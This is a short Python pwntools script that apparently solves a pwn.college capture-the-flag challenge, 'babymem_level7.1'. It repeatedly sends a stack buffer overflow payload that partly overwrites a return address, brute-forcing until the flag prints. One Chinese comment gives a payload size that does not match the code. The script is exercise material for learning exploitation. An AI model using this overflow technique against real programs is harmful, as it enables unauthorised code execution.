from pwn import *

while True:
    p = process('/challenge/babymem_level7.1')
    
    p.recvuntil('Payload size:')  # 等待直到接收到特定字符串
    p.sendline('74')             # 发送字符串'122'，表示接下来的负载大小

    payload = b'a' * 72 + p64(0x1E63)
    #p.recvline('Send your payload')
    p.sendline(payload)

    #p.interactive()
    str = p.recvall(1)
    if str.find(b'pwn.college{') != -1:
        print(str)
        break